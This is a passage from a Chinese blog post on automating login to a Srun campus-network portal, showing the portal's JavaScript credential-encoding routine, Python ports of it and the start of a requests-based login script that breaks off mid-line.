src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/12.png" alt="3"></p><p>可以看到是调用了_encodeUserInfo函数去加密得到i的，那么我们进一步搜索这个函数的加密方式。</p><p>这里我直接贴出来这个加密的函数了。</p><h3 id="加密实现脚本"><a href="#加密实现脚本" class="headerlink" title="加密实现脚本"></a>加密实现脚本</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">_encodeUserInfo.set(_assertThisInitialized(_this), &#123;</span><br><span class="line">      <span class="attr">writable</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">value</span>: <span class="function"><span class="keyword">function</span> <span class="title">value</span>(<span class="params">info, token</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 克隆自 $.base64，防止污染</span></span><br><span class="line">        <span class="keyword">var</span> base64 = _this.clone($.base64); <span class="comment">// base64 设置 Alpha</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        base64.setAlpha(<span class="string">&#x27;LVoJPiCN2R8G90yg+hmFHuacZ1OWMnrsSTXkYpUq/3dlbfKwv6xztjI7DeBE45QA&#x27;</span>); <span class="comment">// 用户信息转 JSON</span></span><br><span class="line"></span><br><span class="line">        info = <span class="built_in">JSON</span>.stringify(info);</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params">str, key</span>) </span>&#123;</span><br><span class="line">          <span class="keyword">if</span> (str === <span class="string">&#x27;&#x27;</span>) <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">          <span class="keyword">var</span> v = s(str, <span class="literal">true</span>);</span><br><span class="line">          <span class="keyword">var</span> k = s(key, <span class="literal">false</span>);</span><br><span class="line">          <span class="keyword">if</span> (k.length &lt; <span class="number">4</span>) k.length = <span class="number">4</span>;</span><br><span class="line">          <span class="keyword">var</span> n = v.length - <span class="number">1</span>,</span><br><span class="line">              z = v[n],</span><br><span class="line">              y = v[<span class="number">0</span>],</span><br><span class="line">              c = <span class="number">0x86014019</span> | <span class="number">0x183639A0</span>,</span><br><span class="line">              m,</span><br><span class="line">              e,</span><br><span class="line">              p,</span><br><span class="line">              q = <span class="built_in">Math</span>.floor(<span class="number">6</span> + <span class="number">52</span> / (n + <span class="number">1</span>)),</span><br><span class="line">              d = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">while</span> (<span class="number">0</span> &lt; q--) &#123;</span><br><span class="line">            d = d + c &amp; (<span class="number">0x8CE0D9BF</span> | <span class="number">0x731F2640</span>);</span><br><span class="line">            e = d &gt;&gt;&gt; <span class="number">2</span> &amp; <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; n; p++) &#123;</span><br><span class="line">              y = v[p + <span class="number">1</span>];</span><br><span class="line">              m = z &gt;&gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span>;</span><br><span class="line">              m += y &gt;&gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span> ^ (d ^ y);</span><br><span class="line">              m += k[p &amp; <span class="number">3</span> ^ e] ^ z;</span><br><span class="line">              z = v[p] = v[p] + m &amp; (<span class="number">0xEFB8D130</span> | <span class="number">0x10472ECF</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            m = z &gt;&gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span>;</span><br><span class="line">            m += y &gt;&gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span> ^ (d ^ y);</span><br><span class="line">            m += k[p &amp; <span class="number">3</span> ^ e] ^ z;</span><br><span class="line">            z = v[n] = v[n] + m &amp; (<span class="number">0xBB390742</span> | <span class="number">0x44C6F8BD</span>);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">return</span> l(v, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">s</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">          <span class="keyword">var</span> c = a.length;</span><br><span class="line">          <span class="keyword">var</span> v = [];</span><br><span class="line"></span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; c; i += <span class="number">4</span>) &#123;</span><br><span class="line">            v[i &gt;&gt; <span class="number">2</span>] = a.charCodeAt(i) | a.charCodeAt(i + <span class="number">1</span>) &lt;&lt; <span class="number">8</span> | a.charCodeAt(i + <span class="number">2</span>) &lt;&lt; <span class="number">16</span> | a.charCodeAt(i + <span class="number">3</span>) &lt;&lt; <span class="number">24</span>;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (b) v[v.length] = c;</span><br><span class="line">          <span class="keyword">return</span> v;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">l</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">          <span class="keyword">var</span> d = a.length;</span><br><span class="line">          <span class="keyword">var</span> c = d - <span class="number">1</span> &lt;&lt; <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (b) &#123;</span><br><span class="line">            <span class="keyword">var</span> m = a[d - <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span> (m &lt; c - <span class="number">3</span> || m &gt; c) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            c = m;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; d; i++) &#123;</span><br><span class="line">            a[i] = <span class="built_in">String</span>.fromCharCode(a[i] &amp; <span class="number">0xff</span>, a[i] &gt;&gt;&gt; <span class="number">8</span> &amp; <span class="number">0xff</span>, a[i] &gt;&gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span>, a[i] &gt;&gt;&gt; <span class="number">24</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">return</span> b ? a.join(<span class="string">&#x27;&#x27;</span>).substring(<span class="number">0</span>, c) : a.join(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#123;SRBX1&#125;&#x27;</span> + base64.encode(encode(info, token));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p>这里也得感谢这位大佬将这个js转成了python脚本，我就直接贴结果了,里面还有一个很明显的base64，这里我也不自己写了，直接贴吧哈哈哈。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#srun_xencode.py</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force</span>(<span class="params">msg</span>):</span></span><br><span class="line">    ret = []</span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> msg:</span><br><span class="line">        ret.append(<span class="built_in">ord</span>(w))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(ret)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ordat</span>(<span class="params">msg, idx</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(msg) &gt; idx:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">ord</span>(msg[idx])</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sencode</span>(<span class="params">msg, key</span>):</span></span><br><span class="line">    l = <span class="built_in">len</span>(msg)</span><br><span class="line">    pwd = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, l, <span class="number">4</span>):</span><br><span class="line">        pwd.append(</span><br><span class="line">            ordat(msg, i) | ordat(msg, i + <span class="number">1</span>) &lt;&lt; <span class="number">8</span> | ordat(msg, i + <span class="number">2</span>) &lt;&lt; <span class="number">16</span></span><br><span class="line">            | ordat(msg, i + <span class="number">3</span>) &lt;&lt; <span class="number">24</span>)</span><br><span class="line">    <span class="keyword">if</span> key:</span><br><span class="line">        pwd.append(l)</span><br><span class="line">    <span class="keyword">return</span> pwd</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lencode</span>(<span class="params">msg, key</span>):</span></span><br><span class="line">    l = <span class="built_in">len</span>(msg)</span><br><span class="line">    ll = (l - <span class="number">1</span>) &lt;&lt; <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> key:</span><br><span class="line">        m = msg[l - <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> m &lt; ll - <span class="number">3</span> <span class="keyword">or</span> m &gt; ll:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        ll = m</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, l):</span><br><span class="line">        msg[i] = <span class="built_in">chr</span>(msg[i] &amp; <span class="number">0xff</span>) + <span class="built_in">chr</span>(msg[i] &gt;&gt; <span class="number">8</span> &amp; <span class="number">0xff</span>) + <span class="built_in">chr</span>(</span><br><span class="line">            msg[i] &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span>) + <span class="built_in">chr</span>(msg[i] &gt;&gt; <span class="number">24</span> &amp; <span class="number">0xff</span>)</span><br><span class="line">    <span class="keyword">if</span> key:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(msg)[<span class="number">0</span>:ll]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(msg)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_xencode</span>(<span class="params">msg, key</span>):</span></span><br><span class="line">    <span class="keyword">if</span> msg == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    pwd = sencode(msg, <span class="literal">True</span>)</span><br><span class="line">    pwdk = sencode(key, <span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(pwdk) &lt; <span class="number">4</span>:</span><br><span class="line">        pwdk = pwdk + [<span class="number">0</span>] * (<span class="number">4</span> - <span class="built_in">len</span>(pwdk))</span><br><span class="line">    n = <span class="built_in">len</span>(pwd) - <span class="number">1</span></span><br><span class="line">    z = pwd[n]</span><br><span class="line">    y = pwd[<span class="number">0</span>]</span><br><span class="line">    c = <span class="number">0x86014019</span> | <span class="number">0x183639A0</span></span><br><span class="line">    m = <span class="number">0</span></span><br><span class="line">    e = <span class="number">0</span></span><br><span class="line">    p = <span class="number">0</span></span><br><span class="line">    q = math.floor(<span class="number">6</span> + <span class="number">52</span> / (n + <span class="number">1</span>))</span><br><span class="line">    d = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">0</span> &lt; q:</span><br><span class="line">        d = d + c &amp; (<span class="number">0x8CE0D9BF</span> | <span class="number">0x731F2640</span>)</span><br><span class="line">        e = d &gt;&gt; <span class="number">2</span> &amp; <span class="number">3</span></span><br><span class="line">        p = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> p &lt; n:</span><br><span class="line">            y = pwd[p + <span class="number">1</span>]</span><br><span class="line">            m = z &gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span></span><br><span class="line">            m = m + ((y &gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span>) ^ (d ^ y))</span><br><span class="line">            m = m + (pwdk[(p &amp; <span class="number">3</span>) ^ e] ^ z)</span><br><span class="line">            pwd[p] = pwd[p] + m &amp; (<span class="number">0xEFB8D130</span> | <span class="number">0x10472ECF</span>)</span><br><span class="line">            z = pwd[p]</span><br><span class="line">            p = p + <span class="number">1</span></span><br><span class="line">        y = pwd[<span class="number">0</span>]</span><br><span class="line">        m = z &gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span></span><br><span class="line">        m = m + ((y &gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span>) ^ (d ^ y))</span><br><span class="line">        m = m + (pwdk[(p &amp; <span class="number">3</span>) ^ e] ^ z)</span><br><span class="line">        pwd[n] = pwd[n] + m &amp; (<span class="number">0xBB390742</span> | <span class="number">0x44C6F8BD</span>)</span><br><span class="line">        z = pwd[n]</span><br><span class="line">        q = q - <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> lencode(pwd, <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#srun_base64.py</span></span><br><span class="line">_PADCHAR = <span class="string">&quot;=&quot;</span></span><br><span class="line">_ALPHA = <span class="string">&quot;LVoJPiCN2R8G90yg+hmFHuacZ1OWMnrsSTXkYpUq/3dlbfKwv6xztjI7DeBE45QA&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_getbyte</span>(<span class="params">s, i</span>):</span></span><br><span class="line">    <span class="comment">#print(s,&#x27; &#x27;,i)</span></span><br><span class="line">    x = <span class="built_in">ord</span>(s[i]);</span><br><span class="line">    <span class="keyword">if</span> (x &gt; <span class="number">255</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;INVALID_CHARACTER_ERR: DOM Exception 5&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base64</span>(<span class="params">s</span>):</span></span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    b10=<span class="number">0</span></span><br><span class="line">    x = []</span><br><span class="line">    imax = <span class="built_in">len</span>(s) - <span class="built_in">len</span>(s) % <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(s) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,imax,<span class="number">3</span>):</span><br><span class="line">        b10 = (_getbyte(s, i) &lt;&lt; <span class="number">16</span>) | (_getbyte(s, i + <span class="number">1</span>) &lt;&lt; <span class="number">8</span>) | _getbyte(s, i + <span class="number">2</span>);</span><br><span class="line">        x.append(_ALPHA[(b10 &gt;&gt; <span class="number">18</span>)]);</span><br><span class="line">        x.append(_ALPHA[((b10 &gt;&gt; <span class="number">12</span>) &amp; <span class="number">63</span>)]);</span><br><span class="line">        x.append(_ALPHA[((b10 &gt;&gt; <span class="number">6</span>) &amp; <span class="number">63</span>)]);</span><br><span class="line">        x.append(_ALPHA[(b10 &amp; <span class="number">63</span>)])</span><br><span class="line">    i=imax</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(s) - imax ==<span class="number">1</span>:</span><br><span class="line">        b10 = _getbyte(s, i) &lt;&lt; <span class="number">16</span>;</span><br><span class="line">        x.append(_ALPHA[(b10 &gt;&gt; <span class="number">18</span>)] + _ALPHA[((b10 &gt;&gt; <span class="number">12</span>) &amp; <span class="number">63</span>)] + _PADCHAR + _PADCHAR);</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(s) - imax == <span class="number">2</span>:</span><br><span class="line">        b10 = (_getbyte(s, i) &lt;&lt; <span class="number">16</span>) | (_getbyte(s, i + <span class="number">1</span>) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">        x.append(_ALPHA[(b10 &gt;&gt; <span class="number">18</span>)] + _ALPHA[((b10 &gt;&gt; <span class="number">12</span>) &amp; <span class="number">63</span>)] + _ALPHA[((b10 &gt;&gt; <span class="number">6</span>) &amp; <span class="number">63</span>)] + _PADCHAR);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(x)</span><br></pre></td></tr></table></figure><hr><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#srun_sha1.py</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sha1</span>(<span class="params">value</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.sha1(value.encode()).hexdigest()</span><br></pre></td></tr></table></figure><p>逻辑这么分析到位了之后接下来就开始写两次抓包的脚本吧，这里也直接给了，毕竟逻辑就真的这么点，主要的工作量都在js转python上面，而已经有人转好了我就直接拿过来用了，这里再次鸣谢huxiaofan1223大佬，本篇博客也贴在上面的传送门当中了。</p><h2 id="模拟登录"><a href="#模拟登录" class="headerlink" title="模拟登录"></a>模拟登录</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">from</span> encryption.srun_md5 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> encryption.srun_sha1 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> encryption.srun_base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> encryption.srun_xencode <span class="keyword">import</span> *</span><br><span class="line">header=&#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.26 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">init_url=<span class="string">&quot;http://10.110.74.91&quot;</span></span><br><span class="line">get_challenge_api=<span class="string">&quot;http://10.110.74.91/cgi-bin/get_challenge&quot;</span></span><br><span class="line"></span><br><span class="line">srun_portal_api=<span class="string">&quot;http://10.110.74.91/cgi-bin/srun_portal&quot;</span></span><br><span class="line">n = <span class="string">&#x27;200&#x27;</span></span><br><span class="line"><span class="built_in">type</span> = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">ac_id=<span class="string">&#x27;4&#x27;</span></span><br><span class="line">enc = <span class="string">&quot;srun_bx1&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_chksum</span>():</span></span><br><span class="line">chkstr = token+username</span><br><span class="line">chkstr += token+hmd5</span><br><span class="line">chkstr += token+ac_id</span><br><span class="line">chkstr += token+ip</span><br><span class="line">chkstr += token+n</span><br><span class="line">chkstr += token+<span class="built_in">type</span></span><br><span class="line">chkstr += token+i</span><br><span class="line"><span class="keyword">return</span> chkstr</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_info</span>():</span></span><br><span class="line">info_temp=&#123;</span><br><span class="line"><span class="string">&quot;username&quot;</span>:username,</span><br><span class="line"><span class="string">&quot;password&quot;</span>:password,</span><br><span class="line"><span class="string">&quot;ip&quot;</span>:ip,</span><br><span class="line"><span class="string">&quot;acid&quot;</span>:ac_id,</span><br><span class="line"><span class="string">&quot;enc_ver&quot;</span>:enc</span><br><span class="line">&#125;</span><br><span class="line">i=re.sub(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="built_in">str</span>(info_temp))</span><br><span class="line">i=re.sub(<span class="string">&quot; &quot;</span>,<span class="string">&#x27;&#x27;</span>,i)</span><br><span class="line"><span class="keyword">return</span> i</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_getip</span>():</span></span><br><span class="line"><span class="keyword">global</span> ip</span><br><span class="line">init_res=requests.get(init_url,headers=header)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;初始化获取ip&quot;</span>)</span><br><span class="line"><span class="comment">#print(init_res.text)</span></span><br><span class="line">ip=re.search(<span class="string">&#x27;ip     : &quot;(.*?)&quot;&#x27;</span>,init_res.text).group(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ip:&quot;</span>,ip)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_token</span>():</span></span><br><span class="line"><span class="comment"># print(&quot;获取token&quot;)</span></span><br><span class="line"><span class="keyword">global</span> token</span><br><span class="line">get_challenge_params=&#123;</span><br><span class="line"><span class="string">&quot;callback&quot;</span>: <span class="string">&quot;jQuery112406608265734960486_&quot;</span>+<span class="built_in">str</span>(<span class="built_in">int</span>(time.time()*<span class="number">1000</span>)),</span><br><span class="line"><span class="string">&quot;username&quot;</span>:username,</span><br><span class="line"><span class="string">&quot;ip&quot;</span>:ip,</span><br><span class="line"><span class="string">&quot;_&quot;</span>:<span class="built_in">int</span>(time.time()*<span class="number">1000</span>),</span><br><span class="line">&#125;</span><br><span class="line">get_challenge_res=requests.get(get_challenge_api,params=get_challenge_params,headers=header)</span><br><span class="line">token=re.search(<span class="string">&#x27;&quot;challenge&quot;:&quot;(.*?)&quot;&#x27;</span>,get_challenge_res.text).group(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(get_challenge_res.text)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;token为:&quot;</span>+token)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_complex_work</span>():</span></span><br><span class="line"><span class="keyword">global</span> i,hmd5,chksum</span><br><span class="line">i=get_info()</span><br><span class="line">i=<span class="string">&quot;&#123;SRBX1&#125;&quot;</span>+get_base64(get_xencode(i,token))</span><br><span class="line">hmd5=get_md5(password,token)</span><br><span class="line">chksum=get_sha1(get_chksum())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;所有加密工作已完成&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">srun_portal_params=&#123;</span><br><span class="line"><span class="string">&#x27;callback&#x27;</span>: <span class="string">&#x27;jQuery11240645308969735664_&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">int</span>(time.time()*<span class="number">1000</span>)),</span><br><span class="line"><span class="string">&#x27;action&#x27;</span>:<span class="string">&#x27;login&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;username&#x27;</span>:username,<span class="comment">#username,</span></span><br><span class="line"><span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;&#123;MD5&#125;&#x27;</span>+hmd5,</span><br><span class="line"><span class="string">&#x27;ac_id&#x27;</span>:ac_id,</span><br><span class="line"><span class="string">&#x27;ip&#x27;</span>:ip,</span><br><span class="line"><span class="string">&#x27;chksum&#x27;</span>:chksum,</span><br><span class="line"><span class="string">&#x27;info&#x27;</span>:i,</span><br><span class="line"><span class="string">&#x27;n&#x27;</span>:n,</span><br><span class="line"><span class="string">&#x27;type&#x27;</span>:<span class="built_in">type</span>,</span><br><span class="line"><span class="string">&#x27;os&#x27;</span>:<span class="string">&#x27;windows+10&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;name&#x27;</span>:<span 